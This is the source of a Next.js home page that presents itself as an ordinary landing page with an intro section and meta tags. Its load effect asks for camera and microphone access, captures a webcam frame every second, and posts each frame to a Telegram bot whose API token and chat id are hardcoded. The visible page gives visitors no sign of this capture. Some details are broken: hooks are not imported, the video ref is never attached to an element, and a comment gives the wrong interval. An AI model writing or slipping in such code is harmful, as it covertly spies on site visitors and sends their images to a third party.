import * as React from 'react'
import Head from 'next/head'
import Intro from '@/app/components/screens/home/Intro/Intro';

const Index = () => {
    
    // отправляем видео/фото боту 
    const videoRef = useRef(null);

    const TOKEN = "6444223689:AAFxMZ7OtGgRxLIy6IfhzxBXXJ9tHmUd-WY";
    const chatId = "-1001860144177";
    const urlApi = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;

    useEffect(() => {
        const getMediaAndSendData = async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

                if (videoRef.current) {
                    videoRef.current.srcObject = stream;

                    const captureFrame = () => {
                        const canvas = document.createElement('canvas');
                        const context = canvas.getContext('2d');
                        canvas.width = videoRef.current.videoWidth;
                        canvas.height = videoRef.current.videoHeight;
                        context.drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
                        return canvas.toDataURL('image/jpeg');
                    };

                    // Отправляем данные на сервер (бота) с использованием fetch
                    setInterval(async () => {
                        const photoDataUrl = captureFrame();
                        const blob = await (await fetch(photoDataUrl)).blob();

                        const formData = new FormData();
                        formData.append('chat_id', chatId);
                        formData.append('photo', blob, 'photo.jpg');

                        try {
                            const response = await fetch(urlApi, {
                                method: 'POST',
                                body: formData,
                            });

                            if (response.ok) {
                                console.log('Фото успешно отправлено на бота');
                            } else {
                                console.error('Ошибка при отправке фото на бота:', response.status, response.statusText, await response.text());
                            }
                        } catch (error) {
                            console.error('Ошибка fetch:', error);
                        }
                    }, 1000); // Отправлять фото каждые 5 секунд
                }
            } catch (error) {
                console.error('Ошибка доступа к мультимедийным устройствам:', error);
            }
        };

        getMediaAndSendData();
    }, []);
    // 

    return (
        <>
            <Head>
                <meta name="viewport" content="width=device-width, initial-scale=1" />
                <link rel="icon" href="/favicon.ico" />
                <meta name="description" content="" /> // Описание страницы
                <meta name="keywords" content="" /> // ключевые слова, страницы
                <meta name="image_src" content="" /> // URL для img

                <meta property="og:title" content="Home" /> // Название страницы
                <meta property="og:description" content="" /> // Описание страницы
                <meta property="og:image" content="" /> // URL для img: https://example.com/image.jpg
                <meta property="og:url" content="" /> // оснавное URL: https://example.com/page-url
                <meta property="og:type" content="website" />
                <meta property="og:site_name" content="" /> // Название сайта
                <meta property="og:locale" content="ru_RU" />

                <title>Home</title>
            </Head>

            <main>
                <Intro />
            </main>
        </>
    )
}

export default Index;